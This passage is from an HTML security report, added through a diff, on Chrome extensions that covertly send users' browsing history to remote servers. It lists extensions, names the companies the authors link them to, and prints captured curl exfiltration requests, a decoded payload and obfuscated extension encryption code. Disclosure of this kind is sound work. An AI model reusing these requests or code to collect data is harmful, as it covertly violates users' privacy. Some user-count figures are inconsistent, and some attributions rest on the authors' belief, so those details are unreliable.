+<td>https://chromewebstore.google.com/detail/eegffimmjajfkmnfapnpiandnbjdjkif</td>
+<td>EssayGet: AI Writer, Humanizer, Rewrite Tool</td>
+<td>245</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/haplmebpjakpcbiokgfpdkemhlndcpek</td>
+<td>包阅网页阅读助手</td>
+<td>241</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/mdfgkcdjgpgoeclhefnjgmollcckpedk</td>
+<td>SHADE: Stylishly Sustainable</td>
+<td>238</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/jlaieagppfmkikkkfbgagdpkmidkmmhd</td>
+<td>Sidenote</td>
+<td>223</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/bdhomkmlcfplpamlpnimlmmgmnbmhamo</td>
+<td>RewardsBunny</td>
+<td>216</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/jhanhfphenjhghflpeldoiklkikkjbpb</td>
+<td>Multigual Interpreter Extension</td>
+<td>209</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/bbdpihagclfjiodkbebbheamdhifhcgl</td>
+<td>YapThread - Record, Bookmark, AI Chat</td>
+<td>204</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/dmniogfnhjfaembommeeamffneaobgcd</td>
+<td>篆刻-文字识别</td>
+<td>181</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/iljchidcebfmojndjdgophngchonnjnp</td>
+<td>Alibaba search by image Beta</td>
+<td>180</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/ccgdboldgdlngcgfdolahmiilojmfndl</td>
+<td>PI Rank</td>
+<td>179</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/ljfifjfjfeiieghmpidimlkblnjdomjh</td>
+<td>Image Downloader Professional Premium</td>
+<td>170</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/fepkmkdameafkbpknifgfhfmoogdcjck</td>
+<td>Whatfix for Google</td>
+<td>158</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/mjmpimbhbeeibeeeknmmdfancbicfonc</td>
+<td>Lovalink: Une bonne action sans changer ta navigation</td>
+<td>152</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/kgjhhnlcfjcjpdmfdhmhabdjbfpicppg</td>
+<td>wikibit</td>
+<td>151</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/pogbhjeckmomgcoebdkhboanolddeaje</td>
+<td>Protico | Web3 Chat &amp; Web3 Lobby</td>
+<td>147</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/bfoaocblmcoandjlhldeljpmoccldicg</td>
+<td>eKonomi</td>
+<td>135</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/dnngcfoognibnkkngfcamgaibjjlkfdn</td>
+<td>Quick History</td>
+<td>125</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/cgcfmjofgjpfbhpgphafeingeflkbjjl</td>
+<td>Forethink - Hyper-personalized AI Agent</td>
+<td>119</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/eacddhhclhfopgdecadpdonpfemndaeo</td>
+<td>AI Web Reactor</td>
+<td>117</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/galjpoldmaegeoidpdmimmdkmememcnb</td>
+<td>ZapIn - Automate Your LinkedIn Engagement</td>
+<td>114</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/cicnfcokdjfnjepkialpbdlfadkhckph</td>
+<td>Alternatives</td>
+<td>112</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/icdofcdkdkfbilfnjonbfdmdeckahkfn</td>
+<td>Autocoupon!</td>
+<td>109</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/hogoebkpcnajkkjdidfhojkljppfalip</td>
+<td>CrowdWise</td>
+<td>108</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/hiiahmfpljemgmnhlaepofeldnnhphmi</td>
+<td>CREATANT Bookmarking Tool</td>
+<td>106</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/bhlmfakmgikajjenjhafifmdkkjchcli</td>
+<td>Wakweli</td>
+<td>105</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/djblghckgfcjfmhhhfnjbiakmmmcmigf</td>
+<td>OffersLove Coupon Finder</td>
+<td>105</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/jgdiindmamodckpmjgoimddpaeaapjpp</td>
+<td>Point - AI Content Central</td>
+<td>104</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/afipijkhaioeopfolgnagcicgpdlcink</td>
+<td>Pricein | same product lower price</td>
+<td>96</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/ihjgcmcigcghjoolblcdcgpkefcjoaji</td>
+<td>옥션가격 추적기</td>
+<td>96</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/ppbdjkgjcmmgddingckiidlakdmgbalo</td>
+<td>AI Agent like Manus for Amazon shopping</td>
+<td>96</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/aflgdgiaihhpkimnpjgeokkcpndllejm</td>
+<td>BoostVocab</td>
+<td>88</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/oojabgademjndedjpcnagfgiglcpolgd</td>
+<td>Numici - annotate, collaborate and synthesize</td>
+<td>87</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/jlohfbdoibjbmbhahkdpcnhedogcjcbl</td>
+<td>wwwhisp</td>
+<td>86</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/hjepnlaapopkiedfendjaieefldndecd</td>
+<td>Greenwich</td>
+<td>64</td>
+</tr>
+</tbody>
+</table>
+<h3 id="whos-behind-the-leaks">Who’s Behind the Leaks?</h3>
+<p>We performed OSINT on every flagged extension: examined the developer
+email, privacy policy URL, store description, and certificate
+information of the exfiltration domains and their website if provided.
+The result is a map of actors:</p>
+<table>
+<colgroup>
+<col style="width: 30%" />
+<col style="width: 38%" />
+<col style="width: 17%" />
+<col style="width: 13%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>Actor</th>
+<th>Replicated browser history leakage (DevTools)</th>
+<th>Not replicated (DevTools)</th>
+<th>Total users (automated scan)</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Unknown</td>
+<td>16,071,214</td>
+<td>3,213,729</td>
+<td>20,546,145</td>
+</tr>
+<tr class="even">
+<td>(Similarweb)</td>
+<td>800,000</td>
+<td></td>
+<td>800,000</td>
+</tr>
+<tr class="odd">
+<td>Alibaba Group</td>
+<td>106,000</td>
+<td>80,000</td>
+<td>186,000</td>
+</tr>
+<tr class="even">
+<td>Aliprice</td>
+<td></td>
+<td>217,276</td>
+<td>418,046</td>
+</tr>
+<tr class="odd">
+<td>Ant Group</td>
+<td></td>
+<td>21,000</td>
+<td>21,000</td>
+</tr>
+<tr class="even">
+<td>AppEsteem</td>
+<td>15,000</td>
+<td></td>
+<td>15,000</td>
+</tr>
+<tr class="odd">
+<td>Banco Pan</td>
+<td></td>
+<td>160,000</td>
+<td>160,000</td>
+</tr>
+<tr class="even">
+<td>Banmu</td>
+<td>4,989</td>
+<td></td>
+<td>4989</td>
+</tr>
+<tr class="odd">
+<td>Big Star Labs (Similarweb)</td>
+<td>3,700,000</td>
+<td></td>
+<td>3,700,000</td>
+</tr>
+<tr class="even">
+<td>BuddyBot</td>
+<td></td>
+<td>1,575</td>
+<td>1,575</td>
+</tr>
+<tr class="odd">
+<td>butterfly effect</td>
+<td></td>
+<td>3,000,000</td>
+<td>3,000,000</td>
+</tr>
+<tr class="even">
+<td>Bytedance</td>
+<td></td>
+<td>80,000</td>
+<td>80,000</td>
+</tr>
+<tr class="odd">
+<td>Curly Doggo</td>
+<td>700,000</td>
+<td>500,000</td>
+<td>1,200,000</td>
+</tr>
+<tr class="even">
+<td>Deal Saving LLC</td>
+<td>5,000</td>
+<td></td>
+<td>5,000</td>
+</tr>
+<tr class="odd">
+<td>FallenMax</td>
+<td></td>
+<td></td>
+<td>700,000</td>
+</tr>
+<tr class="even">
+<td>Felo AI</td>
+<td></td>
+<td>40,000</td>
+<td>40,000</td>
+</tr>
+<tr class="odd">
+<td>Fxeye</td>
+<td>6,151</td>
+<td></td>
+<td>6,151</td>
+</tr>
+<tr class="even">
+<td>Gameograf</td>
+<td></td>
+<td>1,770</td>
+<td>2,770</td>
+</tr>
+<tr class="odd">
+<td>Gan Qiu</td>
+<td>1,373</td>
+<td></td>
+<td>1,373</td>
+</tr>
+<tr class="even">
+<td>goodmoviesinfo</td>
+<td>60,135</td>
+<td>808</td>
+<td>60,943</td>
+</tr>
+<tr class="odd">
+<td>Guardio</td>
+<td>700,000</td>
+<td></td>
+<td>700,000</td>
+</tr>
+<tr class="even">
+<td>Kartikey Tiwari</td>
+<td>100,000</td>
+<td></td>
+<td>100,000</td>
+</tr>
+<tr class="odd">
+<td>LessLab</td>
+<td></td>
+<td>3,000</td>
+<td>3,000</td>
+</tr>
+<tr class="even">
+<td>Lovedeals</td>
+<td></td>
+<td>245</td>
+<td>245</td>
+</tr>
+<tr class="odd">
+<td>Moonshot AI</td>
+<td></td>
+<td>100,000</td>
+<td>100,000</td>
+</tr>
+<tr class="even">
+<td>Neuralnetics</td>
+<td></td>
+<td>10,654</td>
+<td>10,654</td>
+</tr>
+<tr class="odd">
+<td>Offidocs</td>
+<td>1,650,984</td>
+<td>10,2000</td>
+<td>1,753,398</td>
+</tr>
+<tr class="even">
+<td>Ovkas</td>
+<td></td>
+<td>1,157</td>
+<td>1,675</td>
+</tr>
+<tr class="odd">
+<td>Pie</td>
+<td></td>
+<td></td>
+<td>300,000</td>
+</tr>
+<tr class="even">
+<td>Price Technologies</td>
+<td>10,096</td>
+<td></td>
+<td>10,096</td>
+</tr>
+<tr class="odd">
+<td>Semrush</td>
+<td>1,000,000</td>
+<td></td>
+<td>1,000,000</td>
+</tr>
+<tr class="even">
+<td>sh01bid</td>
+<td></td>
+<td>200,000</td>
+<td>200,000</td>
+</tr>
+<tr class="odd">
+<td>Similarweb</td>
+<td>2,300,000</td>
+<td></td>
+<td>2,300,000</td>
+</tr>
+<tr class="even">
+<td>Trillion</td>
+<td>546</td>
+<td></td>
+<td>725</td>
+</tr>
+<tr class="odd">
+<td>Grand Total</td>
+<td>27,231,488</td>
+<td>7,733,214</td>
+<td>37,428,785</td>
+</tr>
+</tbody>
+</table>
+<p>We determined by using honeypot that Similarweb extensions Similar
+Sites is linked to Kontera scraper that is linked to Curly Doggo and
+Offidocs. Kontera scraper is linked to some extensions that we didn’t
+link to any particular Actor. We also believe Big Star Labs is actually
+Similarweb due to similarities that these extensions share with
+Similarweb’s extensions.</p>
+<h2 id="why-this-matters">Why This Matters</h2>
+<h3 id="scale-of-exposure">Scale of Exposure</h3>
+<blockquote>
+<p>37.4 M of users ~ population of Poland</p>
+</blockquote>
+<p>There are only 38 countries with more citizens than Poland. Even if
+some of the extensions are not actively selling your data this matter is
+highly alarming.</p>
+<h3 id="threat-model">Threat Model</h3>
+<ul>
+<li>Profiling &amp; Targeted Advertising – Aggregated browsing histories
+are gold for ad‑tech firms.</li>
+<li>Corporate Espionage – Employees using a “productivity” extension
+could inadvertently leak internal URLs (intranets, SaaS
+dashboards).</li>
+<li>Credential Harvesting – Some extensions also request cookies;
+coupling that with history gives attackers a complete session
+picture.</li>
+</ul>
+<h2 id="examples">Examples</h2>
+<p>We inlcude a few examples of the leakage.</p>
+<h3 id="pop-up-blocker-for-chrome---poper-blocker">Pop up blocker for
+Chrome™ - Poper Blocker</h3>
+<p><code>extension_id: bkkbcggnhapdmkeljlodobbkopceiche</code></p>
+<p>This is the request made to the exfiltration endpoint, raw data are
+obfuscated on purpose.</p>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="st">&#39;https://api2.poperblocker.com/view/update&#39;</span> <span class="dt">\</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Accept: */*&#39;</span> <span class="dt">\</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Accept-Language: en-GB,en-US;q=0.9,en;q=0.8&#39;</span> <span class="dt">\</span></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Connection: keep-alive&#39;</span> <span class="dt">\</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Content-Type: text/plain&#39;</span> <span class="dt">\</span></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Origin: chrome-extension://bkkbcggnhapdmkeljlodobbkopceiche&#39;</span> <span class="dt">\</span></span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Sec-Fetch-Dest: empty&#39;</span> <span class="dt">\</span></span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Sec-Fetch-Mode: cors&#39;</span> <span class="dt">\</span></span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Sec-Fetch-Site: none&#39;</span> <span class="dt">\</span></span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Sec-Fetch-Storage-Access: active&#39;</span> <span class="dt">\</span></span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;User-Agent: XXXXXX&#39;</span> <span class="dt">\</span></span>
+<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;capr: www.google.com&#39;</span> <span class="dt">\</span></span>
+<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;kata: ajax&#39;</span> <span class="dt">\</span></span>
+<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;x-custom-keywords: %5B%5D&#39;</span> <span class="dt">\</span></span>
+<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;x-uuid: XXXXXX&#39;</span> <span class="dt">\</span></span>
+<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a>  <span class="at">--data-raw</span> <span class="st">$&#39;LQFQiQ9EEADTbpTauTauHHH...&#39;</span></span></code></pre></div>
+<p>However, it wasn’t that difficult to decypher. Payload data are
+obfuscated with ROT47.</p>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;u&quot;</span><span class="fu">:</span> <span class="st">&quot;https://www.google.com/search?q=target&quot;</span><span class="fu">,</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;kk&quot;</span><span class="fu">:</span> <span class="st">&quot;&quot;</span><span class="fu">,</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;p&quot;</span><span class="fu">:</span> <span class="st">&quot;&quot;</span><span class="fu">,</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;rd&quot;</span><span class="fu">:</span> <span class="st">&quot;&quot;</span><span class="fu">,</span></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;bin&quot;</span><span class="fu">:</span> <span class="er">XXXXXX</span><span class="fu">,</span></span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;t&quot;</span><span class="fu">:</span> <span class="st">&quot;generated&quot;</span><span class="fu">,</span></span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;q1&quot;</span><span class="fu">:</span> <span class="st">&quot;from_add_bar&quot;</span><span class="fu">,</span></span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;to&quot;</span><span class="fu">:</span> <span class="st">&quot;texted&quot;</span><span class="fu">,</span></span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;tid&quot;</span><span class="fu">:</span> <span class="er">XXXXXX</span><span class="fu">,</span></span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;ch&quot;</span><span class="fu">:</span> <span class="dv">2</span><span class="fu">,</span></span>
+<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;us&quot;</span><span class="fu">:</span> <span class="st">&quot;XXXXXX&quot;</span><span class="fu">,</span></span>
+<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;h&quot;</span><span class="fu">:</span> <span class="st">&quot;XXXXXX&quot;</span><span class="fu">,</span></span>
+<span id="cb2-14"><a href="#cb2-14" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;ver&quot;</span><span class="fu">:</span> <span class="dv">6</span><span class="fu">,</span></span>
+<span id="cb2-15"><a href="#cb2-15" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;sver&quot;</span><span class="fu">:</span> <span class="dv">1</span><span class="fu">,</span></span>
+<span id="cb2-16"><a href="#cb2-16" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;dver&quot;</span><span class="fu">:</span> <span class="dv">1</span><span class="fu">,</span></span>
+<span id="cb2-17"><a href="#cb2-17" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;nid&quot;</span><span class="fu">:</span> <span class="st">&quot;7.9.4&quot;</span><span class="fu">,</span></span>
+<span id="cb2-18"><a href="#cb2-18" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;fiz&quot;</span><span class="fu">:</span> <span class="st">&quot;XXXXXX&quot;</span></span>
+<span id="cb2-19"><a href="#cb2-19" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<h3 id="stylish---custom-themes-for-any-website">Stylish - Custom themes
+for any website</h3>
+<p><code>extension_id: fjnbnpbmkenffdnngjfgmeleoegfcffe</code></p>
+<p>This is challenging case, we didn’t completely decrypt the payload,
+however, we have pretty good idea of what is going on.</p>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="st">&#39;https://userstylesapi.com/top/styles&#39;</span> <span class="dt">\</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Accept: */*&#39;</span> <span class="dt">\</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Accept-Language: en-GB,en-US;q=0.9,en;q=0.8&#39;</span> <span class="dt">\</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Connection: keep-alive&#39;</span> <span class="dt">\</span></span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Content-type: text/plain&#39;</span> <span class="dt">\</span></span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Origin: chrome-extension://fjnbnpbmkenffdnngjfgmeleoegfcffe&#39;</span> <span class="dt">\</span></span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Sec-Fetch-Dest: empty&#39;</span> <span class="dt">\</span></span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Sec-Fetch-Mode: cors&#39;</span> <span class="dt">\</span></span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Sec-Fetch-Site: none&#39;</span> <span class="dt">\</span></span>
+<span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Sec-Fetch-Storage-Access: active&#39;</span> <span class="dt">\</span></span>
+<span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;User-Agent: XXXXXX&#39;</span> <span class="dt">\</span></span>
+<span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;pthl: style&#39;</span> <span class="dt">\</span></span>
+<span id="cb3-13"><a href="#cb3-13" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;styl: news.ycombinator.com&#39;</span> <span class="dt">\</span></span>
+<span id="cb3-14"><a href="#cb3-14" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;x-session-init: s=a3e3e2a81&amp;v=3.4.10&amp;p=0&#39;</span> <span class="dt">\</span></span>
+<span id="cb3-15"><a href="#cb3-15" aria-hidden="true" tabindex="-1"></a>  <span class="at">--data-raw</span> <span class="st">&#39;PyDk...&#39;</span></span></code></pre></div>
+<p>The raw data are not only obfuscated but encrypted. The script
+generates a random, one-time AES-256 key (symmetric key) inside the
+browser. It encrypts your data using that AES key. It takes that
+one-time AES key and encrypts it using a Public RSA Key hardcoded in the
+script. It bundles the encrypted key and the encrypted data together and
+sends them to the server. To decrypt the data, we need the AES key. To
+get the AES key, we need to decrypt the key blockand that is only
+possible with the RSA Private Key. With altering the code it would be
+possible to pause service worker and capture this AES generated key. We
+will leave this as fun exercise to the reader. The leakage for this
+endpoint is confirmed as the encrypted payload grows with longer browsed
+URL.</p>
+<p>For the record here is the code where the encrypton is done.</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a>_ProductsContainer<span class="op">.</span><span class="at">_createAnimation8</span> <span class="op">=</span> {</span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>    <span class="dt">init</span><span class="op">:</span> <span class="kw">function</span>(e) {</span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>        <span class="kw">const</span> t <span class="op">=</span> _ProductsContainer<span class="op">.</span><span class="at">_createAnimation8</span><span class="op">,</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>            n <span class="op">=</span> e<span class="op">.</span><span class="at">instance</span><span class="op">,</span></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>            a <span class="op">=</span> {</span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>                <span class="dt">s</span><span class="op">:</span> <span class="st">&quot;a3e3e2a81&quot;</span><span class="op">,</span></span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a>                <span class="dt">sub</span><span class="op">:</span> chrome<span class="op">.</span><span class="at">runtime</span><span class="op">.</span><span class="fu">getManifest</span>()<span class="op">.</span><span class="at">version</span><span class="op">,</span></span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a>                <span class="dt">pid</span><span class="op">:</span> n<span class="op">.</span><span class="at">removal</span></span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a>            }<span class="op">;</span></span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a>        t<span class="op">.</span><span class="at">class</span> <span class="op">=</span> <span class="kw">class</span> {</span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a>                <span class="fu">assertScopeValues</span>(e<span class="op">,</span> t<span class="op">,</span> n) {</span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a>                    <span class="kw">const</span> a <span class="op">=</span> <span class="bu">JSON</span><span class="op">.</span><span class="fu">stringify</span>(n)<span class="op">,</span></span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a>                        s <span class="op">=</span> <span class="fu">btoa</span>(a)<span class="op">,</span></span>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a>                        i <span class="op">=</span> <span class="bu">Math</span><span class="op">.</span><span class="fu">random</span>()<span class="op">.</span><span class="fu">toString</span>(<span class="dv">36</span>)<span class="op">.</span><span class="fu">substring</span>(<span class="dv">2</span><span class="op">,</span> <span class="dv">4</span>)<span class="op">.</span><span class="fu">toUpperCase</span>() <span class="op">+</span> s<span class="op">,</span></span>
+<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a>                        r <span class="op">=</span> {}<span class="op">;</span></span>
+<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a>                    <span class="cf">return</span> r[e] <span class="op">=</span> i<span class="op">,</span></span>
+<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a>                        r[t] <span class="op">=</span> <span class="st">&quot;9&quot;</span><span class="op">,</span></span>
+<span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a>                        r</span>
+<span id="cb4-19"><a href="#cb4-19" aria-hidden="true" tabindex="-1"></a>                }</span>
+<span id="cb4-20"><a href="#cb4-20" aria-hidden="true" tabindex="-1"></a>                <span class="kw">async</span> <span class="fu">compilationGenerator</span>() {</span>
+<span id="cb4-21"><a href="#cb4-21" aria-hidden="true" tabindex="-1"></a>                    <span class="cf">return</span> self<span class="op">.</span><span class="at">crypto</span><span class="op">.</span><span class="at">subtle</span><span class="op">.</span><span class="fu">generateKey</span>({</span>
+<span id="cb4-22"><a href="#cb4-22" aria-hidden="true" tabindex="-1"></a>                        <span class="dt">name</span><span class="op">:</span> <span class="st">&quot;AES-GCM&quot;</span><span class="op">,</span></span>
+<span id="cb4-23"><a href="#cb4-23" aria-hidden="true" tabindex="-1"></a>                        <span class="dt">length</span><span class="op">:</span> <span class="dv">256</span></span>
+<span id="cb4-24"><a href="#cb4-24" aria-hidden="true" tabindex="-1"></a>                    }<span class="op">,</span> <span class="op">!</span><span class="dv">0</span><span class="op">,</span> [<span class="st">&quot;encrypt&quot;</span><span class="op">,</span> <span class="st">&quot;decrypt&quot;</span>])</span>
+<span id="cb4-25"><a href="#cb4-25" aria-hidden="true" tabindex="-1"></a>                }</span>
+<span id="cb4-26"><a href="#cb4-26" aria-hidden="true" tabindex="-1"></a>                <span class="fu">mergeRuleConfigs</span>(e<span class="op">,</span> t) {</span>
+<span id="cb4-27"><a href="#cb4-27" aria-hidden="true" tabindex="-1"></a>                    <span class="kw">const</span> n <span class="op">=</span> <span class="fu">btoa</span>(<span class="bu">String</span><span class="op">.</span><span class="at">fromCharCode</span><span class="op">.</span><span class="fu">apply</span>(<span class="kw">null</span><span class="op">,</span> <span class="kw">new</span> <span class="bu">Uint8Array</span>(e)))<span class="op">,</span></span>
+<span id="cb4-28"><a href="#cb4-28" aria-hidden="true" tabindex="-1"></a>                        a <span class="op">=</span> <span class="fu">btoa</span>(<span class="bu">String</span><span class="op">.</span><span class="at">fromCharCode</span><span class="op">.</span><span class="fu">apply</span>(<span class="kw">null</span><span class="op">,</span> <span class="kw">new</span> <span class="bu">Uint8Array</span>(t)))<span class="op">;</span></span>
+<span id="cb4-29"><a href="#cb4-29" aria-hidden="true" tabindex="-1"></a>                    <span class="cf">return</span> <span class="st">&quot;&quot;</span><span class="op">.</span><span class="fu">concat</span>(n<span class="op">,</span> <span class="st">&quot;,&quot;</span>)<span class="op">.</span><span class="fu">concat</span>(a)</span>
+<span id="cb4-30"><a href="#cb4-30" aria-hidden="true" tabindex="-1"></a>                }</span>
+<span id="cb4-31"><a href="#cb4-31" aria-hidden="true" tabindex="-1"></a>                <span class="kw">async</span> <span class="fu">CmpNullValue</span>(e<span class="op">,</span> t<span class="op">,</span> n) {</span>
